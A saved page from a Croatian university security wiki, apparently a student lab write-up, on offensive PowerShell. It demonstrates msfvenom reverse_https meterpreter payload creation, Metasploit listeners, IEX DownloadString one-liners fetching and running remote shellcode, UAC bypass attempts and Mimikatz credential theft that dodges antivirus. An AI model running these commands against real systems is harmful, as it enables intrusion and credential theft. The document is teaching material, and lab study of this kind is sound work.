@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Offensive powershell - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Offensive_powershell&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Offensive_powershell skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Offensive powershell</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Offensive_powershell.html#mw-head">orijentacija</a>,
+					<a href="Offensive_powershell.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Temu rezervirao: Tarek Saghir <br />
+</p>
+<h2> <span class="mw-headline" id="Uvod"> Uvod </span></h2>
+<p>Powershell je ugrađeni 'command shell' kojeg podržavaju svi Windowsi (počevši od Windows 7) i sadrži veliku fleksibilnost oko administracije Windows sustava.Zbog te fleksibilnosti sve više se koristi kod napadača jer se Powershell kod može pokrenuti u memoriji gdje antivirus ne može detektirati opasanost. Također kod se može skinuti sa web stranice i pokrenuti je u memoriji te ima mogućnost pokretanja .Net koda. Korištenje ofenzivnog Powershella je u porastu od 2012. kada se pojavio PowerSploit, odnosno Post-Exploitation Framework. Koristi se za pregled podataka, eskalacija privilegijskih prava, krađa vjerodajnica, itd.<sup><a href="Offensive_powershell.html#Literatura">[1]</a></sup> <br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Offensive_powershell.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Offensive_powershell.html#Postavljanje_radne_okoline"><span class="tocnumber">2</span> <span class="toctext">Postavljanje radne okoline</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="Offensive_powershell.html#Postavljanje_exploit-a"><span class="tocnumber">2.1</span> <span class="toctext">Postavljanje exploit-a</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-4"><a href="Offensive_powershell.html#PowerSploit"><span class="tocnumber">3</span> <span class="toctext">PowerSploit</span></a>
+<ul>
+<li class="toclevel-2 tocsection-5"><a href="Offensive_powershell.html#Invoke-ShellCode_i_Invoke-Mimikatz_u_akciji"><span class="tocnumber">3.1</span> <span class="toctext">Invoke-ShellCode i Invoke-Mimikatz u akciji</span></a>
+<ul>
+<li class="toclevel-3 tocsection-6"><a href="Offensive_powershell.html#Pristup_.C5.BErtvi_preko_Invoke-Shellcode"><span class="tocnumber">3.1.1</span> <span class="toctext">Pristup žrtvi preko Invoke-Shellcode</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-7"><a href="Offensive_powershell.html#Zaklju.C4.8Dak"><span class="tocnumber">4</span> <span class="toctext">Zaključak</span></a></li>
+<li class="toclevel-1 tocsection-8"><a href="Offensive_powershell.html#Literatura"><span class="tocnumber">5</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+Napadači imaju više opcija, a korištenje PowerShella je jedna od njih koja ima svoje napadačke sposobnosti i prednosti:<sup><a href="Offensive_powershell.html#Literatura">[1]</a></sup><sup><a href="Offensive_powershell.html#Literatura">[2]</a></sup>
+</p>
+<ul><li> Pokretanje koda u memoriji bez interakcije sa diskom
+</li><li> Download i izvršavanje koda sa drugog sustava
+</li><li> Sučelje s .Net I Windows API-om
+</li><li> Ugrađeni remoting
+</li><li> CMD.exe je većinom blokiran, ali Powershell u nekim slučajevima nije
+</li><li> Većina organizacije ne paze na PowerShell aktivnost
+</li></ul>
+<p><br />
+Neki od PowerShell napadačkih alata su:<sup><a href="Offensive_powershell.html#Literatura">[1]</a></sup><sup><a href="Offensive_powershell.html#Literatura">[2]</a></sup>
+</p>
+<ul><li> PowerSploit
+</li><li> Invoke-Mimikatz
+</li><li> PowerView
+</li><li> PowerUp
+</li><li> Nishang
+</li><li> PowerShell Empire, itd.
+</li></ul>
+<p>U ovom projektu detaljnije ćemo pogledati PowerSploit i Invoke-Mimikatz alate.
+</p>
+<h2> <span class="mw-headline" id="Postavljanje_radne_okoline"> Postavljanje radne okoline </span></h2>
+<p>Alati koji se koriste u ovom projektu su Oracle VirtualBox te .iso slike Kali Linux-a (u nastavku Kali sustav) i Windows 10 (u nastavku Windows sustav) operacijskih sustava. Osim instaliranja sustava trebale su se složiti mrežne postavke gdje se postavilo da mreža bude „Bridged Networking“. Da bi testirali je li nam radna okolina dobro postavljena pridobio se shell pristup Windows sustavu preko msfconsole u Kali sustavu koristeći web_delivery exploit.
+</p>
+<h3> <span class="mw-headline" id="Postavljanje_exploit-a"> Postavljanje exploit-a </span></h3>
+<p>U Kali sustavu otvara se msf konzola koja je najpopularnije sučelje Metasploit Framework-a. Preko konzole msf-a odabire se željeni exploit i postavlja se slušatelj koji čeka kompromitirano računalo. <br />
+Matasploit je alat za izradu exploit koda koji se koristi za napad na udaljenu žrtvu. Trenutno sadrži preko 438 payload-a te neki od njih su: <sup><a href="Offensive_powershell.html#Literatura">[3]</a></sup><sup><a href="Offensive_powershell.html#Literatura">[4]</a></sup> 
+</p>
+<ul><li> Command shell -  omogućava pokretanje skripta na kompromitiranom računalu
+</li><li> Meterpreter - omogućava kontrolu ekrana, mogućnost pregledavanja te upload i download podataka
+</li><li> Dynamic payloads - omogućava izbjegavanje anti-virusnih  sustava generiranjem jedinstvenih payloada
+</li></ul>
+<p><br />
+Na slici 1. prikazane su naredbe koje su unešene u msf konzolu prilikom odabira exploita. Odabran je <i>web_delivery</i> exploit, postavljen je LHOST(192.168.1.15) ip adrese u Kali sustavu, postavljen je target(cilj explita) čija je dafualt vrijednost 0(Python) na 2(PowerShell) te na kraju postavljen je payload gdje označavamo da se radi o Windows operacijskom sustavu, da će se koristiti meterpreter za kontrolu nad računalom i da će se to sve obaviti preko reverse_tcp-a. <br />
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:719px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Msfconsole_properties.png" class="image"><img alt="" src="../images/0/00/Msfconsole_properties.png" width="717" height="152" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Msfconsole_properties.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 1.</b> Naredbe za metasploit</div></div></div></div> <br />
+<p>Nakon napisanih naredbi napisana je naredba show options koja nam prikazuje sve postavke koje smo napravili. Sve postavke su prikazane na slici 2.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Tarek_msfconsole_show_options.png" class="image"><img alt="" src="../images/thumb/3/35/Tarek_msfconsole_show_options.png/800px-Tarek_msfconsole_show_options.png" width="800" height="313" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Tarek_msfconsole_show_options.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 2.</b>  Prikaz postavki</div></div></div></div> <br />
+<p>Sljedeće naredba je <i>exploit</i> (Slika 3.) koja pokreće listener i generira naredbu koju treba izvršiti u Windows sustavu kako bi se dobio shell pristup (Slika 4.).  Exploit radi u pozadini i pokreće se reverse TCP handler na adresi 192.168.1.15:4444. Nardba koja je generirana pokreće se u Windows 'Run'(windows key + R) aplikaciji a zapravo pokreće powershell gdje pokreće web klijent i skida string sa IP adrese Kali sustava. Kada se naredba izvrši (Slika 3.) vidimo u zadnjoj linija da je meterpreter sesija otvorena i da se slušatelj radi na adresi 192.168.1.15:4444(Kali) prema 192.168.1.14:49484 (Windows). <br />
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Tarek_Exploit.png" class="image"><img alt="" src="../images/thumb/e/ed/Tarek_Exploit.png/900px-Tarek_Exploit.png" width="900" height="181" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Tarek_Exploit.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 3.</b>  Postavljen exploit</div></div></div></div>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:639px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Skripta_windowsi.PNG" class="image"><img alt="" src="../images/8/8e/Skripta_windowsi.PNG" width="637" height="411" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Skripta_windowsi.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 4.</b>  Pokretanje exploit naredbe u Windows sustavu</div></div></div></div>
+<p>Kada se naredba izvršila u Windows sustavu, pomoću naredbe <i>session -l</i> ispisuje se lista svih sesisja. Ta lista je zapisana tablicom u kojoj vidimo ID sesije, koji je tip, informacije o računalu kojemu je otvoren pristup, te konekciju koja prikazuje IP adrese oba sustava (Slika 5.). Naredbom <i>sessions -i 1</i> radi se interakcija sa sesijom ID-a 1 te se dobiva pristup računalu preko meterpreter naredbene linije. Upisom naredbe <i>help</i> u liniju dobije se popis svih naredbi koje možemo izvršiti koje će se izvršiti na kompromitiranom računali. Tako napadač preko osnovnih naredbi može vidjeti sve procese koji se vrte u pozadini, može migrirati sa jednog na drugi proces te može uspavati meterpreter pa ga ponovno kasnije aktivirati. Pomoću <i>File system</i> naredba može dowload-ati i upload-ati datoteke po želji te stvarati nove direktorije, itd. Pomoću <i>Networking</i> naredba ima pristup informacijama mreže kompromitiranog računala, preko <i>System</i> naredba ima pristup sustavu, logovima i procesima i shell-u. Također, najzanimljivije je što ima pristup web kameri te može snimati zvukove preko mikrofona kamere, može započeti video chat, a isto tako može spremiti sliku trenutačnog zaslona i vidjeti što žrtva napada radi. Na slici 6. je prikazano korištenje <i>screenshot</i> naredbe gdje se slika spremila u <i>root</i> od Kali sustava.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Session_interaction.png" class="image"><img alt="" src="../images/thumb/c/c0/Session_interaction.png/900px-Session_interaction.png" width="900" height="152" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Session_interaction.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 5.</b>  Prikaz trenutačnih sesija s kojima je moguća interakcija</div></div></div></div>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screenshot_winsa.png" class="image"><img alt="" src="../images/thumb/0/07/Screenshot_winsa.png/800px-Screenshot_winsa.png" width="800" height="423" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screenshot_winsa.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 6.</b>  Screenshot spremljen na Kali sustavu</div></div></div></div> <br />
+<h2> <span class="mw-headline" id="PowerSploit"> PowerSploit </span></h2>
+<p>PowerSploit (u nastavku PS) je kolekcija PowerShell skripta koje su koristan alat za penetracijske testere u post-eksploatacijskoj fazi penetracijskog testiranja. Kolekcija puno mogućnosti što PS može učiniti jer je lakše uočiti slabe točke na potencijalnoj žrtvi. Ako je netko primamljiva meta nije pitanje hoće li se dogoditi napad nego već kada će se dogoditi napad. Pomoću PS-a pronalaze se slabe točke u na računalima, organizaciji, poduzeću koje penetracijski tester sakljuplja i sastavlja izvješće puno korisnih informacija. Te informacije vrlo važne ukoliko se žele donositi daljnje odluke o sigurnosti u organizaciji.<sup><a href="Offensive_powershell.html#Literatura">[5]</a></sup> 
+</p><p>Na github linku: <a href="https://github.com/PowerShellMafia/PowerSploit" class="external free" rel="nofollow">https://github.com/PowerShellMafia/PowerSploit</a> nalazi se cijela kolekcija gdje se vidi popis svih kompromintiranih naredbi, a i sam repozitorij gdje u skriptama pronalazimo komentare ukoliko se netko želi dodatno informirati na koji način rade pojedine skripte. Na repozitoriju su sve skripte organizirane i kategorizirane na sljedeći način:<sup><a href="Offensive_powershell.html#Literatura">[5]</a></sup>
+</p>
+<table class="wikitable">
+
+<tr>
+<th>Kategorija
+</th>
+<th>Opis
+</th></tr>
+<tr>
+<td>Antivirus Bypass
+</td>
+<td>Pronalazi Bajtove datoteke koje imaju isti potpis u antivirusu
+</td></tr>
+<tr>
+<td>Code execution
+</td>
+<td>Koristi se za izvršenje koda na komprominitiranom računalu
+</td></tr>
+<tr>
+<td>Exfiltration
+</td>
+<td>Manipulacija i sakupljanje informacija i podataka iz kompromitiranog računala
+</td></tr>
+<tr>
+<td>Persistence
+</td>
+<td>Održavanje kontrole kompromitiranog računla dodavanjem dodatnog sadržaja skriptama
+</td></tr>
+<tr>
+<td>PE Tools
+</td>
+<td>PowerShell cmdlet-i za enumeracije
+</td></tr>
+<tr>
+<td>Recon
+</td>
+<td>Traženje podataka i tragova koristeći kompromitirano računalo
+</td></tr>
+<tr>
+<td>Reverse Engineering
+</td>
+<td>Pomoć u reverse inženjeringu i malware analizi. (Pomaknuto u PowerShellArsenal)
+</td></tr>
+<tr>
+<td>Script Modification
+</td>
+<td>Kreiranje i manipuliranje skriptama na kompromitiranom računalu
+</td></tr>
+</table>
+<p>U PS-u ima puno skripta, ali ovdje će se detaljnije proučiti <i>Invoke-Shellcode</i> skripta te <i>Invoke-Mimikatz</i> skripta.
+</p><p><b>Invoke-Shellcode</b><sup><a href="Offensive_powershell.html#Literatura">[5]</a></sup><br />
+To je PowerShell skripta koje se koristi za ubacivanje u proizvoljnog <i>shellcode-a</i> ili <i>Metasploit pyload-a</i> u novi ili postoći proces te ga izvršava. Prednost takvih skripta jest da su neprepoznatljive antivirusnim sustavima, izvršavaju se u memoriji te niti jedan podatak se ne zapisuje na tvrdi disk. Instaliranje skripte se izvršava upisom naredbe u PowerShell komandnu liniju:<br />
+<code>
+IEX(New-Object Net.WebClient).DownloadString("<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1" class="external free" rel="nofollow">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1</a>")
+</code><br />
+</p><p>Način na koji se dobio pristup sustavu biti će objašnjeno u sljedećem poglavlju
+</p><p><b>Mimikatz</b><sup><a href="Offensive_powershell.html#Literatura">[6]</a></sup><br />
+Alat koji se koristi većinom za prikupljanje kredencijskih podataka iz Windows OS-a. To je Windows x32/x64 program kodiran u C programskom jeziku. Autor je <i>Benjamin Deply (@gentilkiwi)</i>, a napravljen je 2007. godine. Većina <i>mimikatz</i> funkcionalnosti je dostupna u PS-u preko naredbe <i>Invoke-Mimikatz</i> koja reflektivno u memoriju ubacuje <i>Mimikatz 2.0</i> pomoću skripte <i>Invoke-ReflectivePEInjection</i> odnosno, reflektivno se ubacuje Mimikatz DLL, koji je ugrađen u skriptu, u memoriju.
+</p>
+<h3> <span class="mw-headline" id="Invoke-ShellCode_i_Invoke-Mimikatz_u_akciji"> Invoke-ShellCode i Invoke-Mimikatz u akciji </span></h3>
+<p>U drugom djelu zadatka biti će prikazano kako otvoriti <i>meterpreter shellcode</i> sa <i>msfvenom-om</i> na Kali OS koji ćemo uploadati na repozitorij github-a te na Windows OS skinuti PowerSploit the pomoću skripte Invoke-Shellcode dobiti pristup računalu. Ono što je bitno za zapaziti ovdje jest da se će <i>meterpreter shellcode</i> i PS skripta biti ubačena u memoriju pa Windows Defender neće zapaziti nikakvu prijetnju. Na našem Kali napadačkom sustavu ćemo imati pristup <i>meterpreter</i> ljusci. <br />
+U drugom dijelu ćemo prikazati kako se može podizati sustavska privilegija, otvoriti powershell na Kali sustavu preko <i>meterpreter</i> ljuske te kako skinuti PS Mimikatz i izvršiti <i>Inovke-Mimikatz</i> skriptu opet zaobilazeći bilo kakav antivirusni sustav jer će se sve to izvršiti u memoriji, Na kraju ćemo ispisati sve kredencijske oznake u Windows OS-u.
+</p>
+<h4> <span class="mw-headline" id="Pristup_.C5.BErtvi_preko_Invoke-Shellcode"> Pristup žrtvi preko Invoke-Shellcode </span></h4>
+<p><b>Kali Linux</b>
+</p><p>Za početak u Kali sustavu napravljen je <i>meterpreter shellcode</i> sa <i>msfvenomom</i>. To je sučelje u komandoj linij preko kojeg se može brzo napisati napisati upit koji je potreban. Glavna prednost je njegova odvojenost kao zaseban alat, ima standardizirane opcije u komandnoj liniji, puno brže i lakše je napisati naredbu koja je potrebna.<sup><a href="Offensive_powershell.html#Literatura">[7]</a></sup><br />
+Nakon toga taj <i>shellcode</i> uploadan je na github repozitorij preko kojega će se u raw formatu skinuti i izvršiti u jednoj liniji kratke PowerShell skripte na Windows sustavu. Za izvršenje te skripte potrebno je također skinuti u raw formatu Invoke-Shellcode skriptu sa PowerSploit<sup><a href="Offensive_powershell.html#Literatura">[8]</a></sup><br /> github repozitorija. To će također biti jednolinijska kratka skripta koja će se izvršiti u PowerShell-u.<br />
+</p><p>Naredba za kreiranje <i>msfvenom</i> shellcode-a:<br />
+</p>
+<pre>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.15
+LPORT=443 -f powershell -o Desktorp/MeterpStager
+</pre>
+<ul><li> <i>-p</i> označava payload koji će biti napravljen, a ovdje je kontkretno payload za Windows operacijski sustav (64 bit), koristit će se <i>meterpreter</i> i <i>reverse_https</i> 
+</li><li> <i>LHOST=192.168.1.15</i> označava IP adresu Kali sustava
+</li><li> <i>LPORT=443</i> port 443 služi za web stranice koje koriste SSL.
+</li><li> <i>-f</i>  označava format podataka koji će biti spremljeni. Za ovaj primjer spremljeno je na Desktop pod imenom <i>MeterpStager</i> u <i>plain text</i> dokumentu.
+</li></ul>
+<p>Taj <i>shellcode</i> se uploadao na github repozitorij i koristit će kasnije kad će se izvršavati naredbe na žrtvinom računalu (Windows), primjer kako to izgleda možete pogledati u <i>raw</i> formatu na <a href="https://raw.githubusercontent.com/tsaghir/SIS/master/pentest" class="external free" rel="nofollow">https://raw.githubusercontent.com/tsaghir/SIS/master/pentest</a>.<br />
+</p><p>Nadalje, otvara se opet <i>msfconsole</i> kako bi se postavio <i>listener</i>:
+</p>
+<pre>msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_https
+payload =&gt; windows/x64/meterpreter/reverse_https
+msf exploit(handler) &gt; set LHOST=192.168.1.15
+LHOST =&gt; 192.168.1.15
+msf exploit(handler) &gt; LPORT=443
+LPORT =&gt; 443
+msf exploit(handler) &gt; exploit
+</pre>
+<p><i>Listener</i> je postavljen i očekuje radnju koja će se u sljedećem koraku izvršiti u Windows sustavu.
+</p><p><br />
+<b>Windows 10</b>
+</p><p>Prebacujemo se na Windows sustav gdje otvaramo PowerShell i upisujemo sljedeće dvije naredbe: <br />
+</p>
+<div class="thumb tleft"><div class="thumbinner" style="width:602px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Powersploit_powershell_naredbe.PNG" class="image"><img alt="" src="../images/thumb/5/5c/Powersploit_powershell_naredbe.PNG/600px-Powersploit_powershell_naredbe.PNG" width="600" height="32" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Powersploit_powershell_naredbe.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 7. </b> PowerShell naredbe za <i>Invoke-Shellcode</i></div></div></div><br /><br /><br />
+<p><br />
+</p><p>Na slici vidimo jednolinijske skripte gdje:
+</p>
+<ol><li> <i>IEX</i> otvara Internet Explorer, radi se novi objekt WebClient klase i skida se <i>string</i> pod zadanom url adresom
+</li><li> Koristio se bitly za skraćivanje URL <a href="https://bitly.com/" class="external free" rel="nofollow">https://bitly.com/</a>, ali u prvoj skripti skida se <i>Invoke-Shellcode</i> skripta <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1" class="external free" rel="nofollow">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1</a>, dok se u drugoj skripti skida <a href="https://raw.githubusercontent.com/tsaghir/SIS/master/pentest" class="external free" rel="nofollow">https://raw.githubusercontent.com/tsaghir/SIS/master/pentest</a> <i>shell code</i> u raw formatu.
+</li></ol>
+<p>Za kraj upisuje se linika koda:
+</p>
+<pre>Invoke-Shellcode -Shellcode @($buf)
+</pre>
+<p>I naš <i>shellcode</i> se ubacuje u PowerShell proces. Na kraju to izgleda ovako:<br />
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:1502px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Powersploit_powershell_rezultat.PNG" class="image"><img alt="" src="../images/thumb/b/b8/Powersploit_powershell_rezultat.PNG/1500px-Powersploit_powershell_rezultat.PNG" width="1500" height="398" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Powersploit_powershell_rezultat.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 8. </b> Rezultat <i>Invoke-Shellcode</i> skripte u Kali i Windows operacijskim sustavima</div></div></div></div>
+<p>Prva sesija je napravljena te je upisana naredba <i>getsystem</i> da bi se vidjelo je li imamo adminska prava. Na slici 9. prikazano je da nema adminska prava, sesija je prebačena u pozadinu i kreće se u misiju zaobilaženja <i>User Access Contol-a</i> kako bi se podigla privilegija na razinu admina.
+</p><p><b>bypassuac</b>
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Powersploit_msf_bypassuac.PNG" class="image"><img alt="" src="../images/thumb/e/eb/Powersploit_msf_bypassuac.PNG/900px-Powersploit_msf_bypassuac.PNG" width="900" height="200" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Powersploit_msf_bypassuac.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 9. </b> <i>getsystem</i> i <i>bypassuac</i></div></div></div></div>
+<p>Ono što je potrebno za ovaj exploit jest sesija koja je postavljena pod ID. pa sve što je trebalo napraviti jest:
+</p>
+<pre>msf exploit(bypassuac) &gt; set payload windows/x64/meterpreter/reverse_https
+payload =&gt; windows/x64/meterpreter/reverse_https
+msf exploit(bypassuac) &gt; set session 1
+msf exploit(bypassuac) &gt; exploit
+</pre>
+<p>Na žalost bypassuac ne radi za Windows 10 sustav i kao obavijest piše da sustav nije ranjiv(Slika 10.).
+</p><p><b>bypassuac_vbs</b>
+</p><p>Slijedeći exploit je bio bypassuac_vbs kojemo je trebalo također postaviti sesiju i lport te samo pokrenuti exploit naredbom <i>run</i>, ali niti taj exploit nije radio jer je također pisalo da Windows 10 nije ranjiv. Slika 10. prikazuje rezultat: <br />
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Bypassuac_vbs_fail.PNG" class="image"><img alt="" src="../images/thumb/1/1e/Bypassuac_vbs_fail.PNG/900px-Bypassuac_vbs_fail.PNG" width="900" height="163" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Bypassuac_vbs_fail.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 10. </b> Rezultat <i>bypassuac_vbs</i> exploit-a</div></div></div></div>
+<p><b>bypassuac_injection</b>
+</p><p>Sljedeći exploit je proradio i uspio je probiti UAC, ali je Virtalna mašina bila prespora, meterpreter je kasnije i samo odjednom se izgasio. Rezultat meterpreter otvorene sesije prikazano je na slici 11.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Msf_bypassuac_injection.PNG" class="image"><img alt="" src="../images/thumb/1/10/Msf_bypassuac_injection.PNG/900px-Msf_bypassuac_injection.PNG" width="900" height="225" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Msf_bypassuac_injection.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 11. </b> Rezultat <i>bypassuac_injection</i> exploit-a</div></div></div></div>
+<p><b> ask i payload_inject </b>
+</p><p>Zadnji pokušaj je bio kombinacija dvaju exploit-a. Za <i>ask</i> bilo je također potrebno postaviti sesiju već spomenutom naredbom te pokrenuti exploit gdje slika 12. prikazuje rezultat. 
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ask_exploit.PNG" class="image"><img alt="" src="../images/thumb/c/c3/Ask_exploit.PNG/900px-Ask_exploit.PNG" width="900" height="202" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ask_exploit.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 12. </b> Rezultat <i>ask</i> exploit-a</div></div></div></div>
+<p>Na slici 12 se vidi da upisom naredbe <i>getsystem</i> piše da smo dobili pristup adminskim pravima, ali prije toga nam se u Windows sustavu prikazao Yes/No box koji je prikazan na slici 13.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:644px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ask_uacbypass_windows.PNG" class="image"><img alt="" src="../images/b/b9/Ask_uacbypass_windows.PNG" width="642" height="362" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ask_uacbypass_windows.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 13. </b> Rezultat u Windows sustavu nakon pokretanja <i>ask</i> exploit-a</div></div></div></div>
+<p>zadnji korak je korištenje <i>payload_inject</i> exploita za kojeg je bilo potrebno upisati sljedeće naredbe:<br />
+</p>
+<pre>msf exploit(payload_inject) &gt; set payload windows/x64/powershell_reverse_tcp
+payload =&gt; windows/x64/powershell_reverse_tcp
+msf exploit(payload_inject) &gt; exploit
+</pre>
+<p>Postavljen je payload i kada se exploit pokrene dobiva se pristup PowerShell kontorolama napadnutog računala. Sve što je preostalo jest ubaciti mimikatz koji se nalazi na github repozitoriju PowerSploit-a<sup><a href="Offensive_powershell.html#Literatura">[8]</a></sup>(Slika 14.)
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Payload_inject_exploit.PNG" class="image"><img alt="" src="../images/thumb/4/4b/Payload_inject_exploit.PNG/900px-Payload_inject_exploit.PNG" width="900" height="233" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Payload_inject_exploit.PNG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 14. </b> Rezultat <i>payload_inject</i> exploit-a, PowerShell komandna linija</div></div></div></div>
+<p>Na slici se također vidi da je pozvana naredba
+</p>
+<pre>IEX(New-Object Net.WebClient).DownloadString('<a href="http://bit.ly/1N83FO'" class="external free" rel="nofollow">http://bit.ly/1N83FO'</a>)
+</pre>
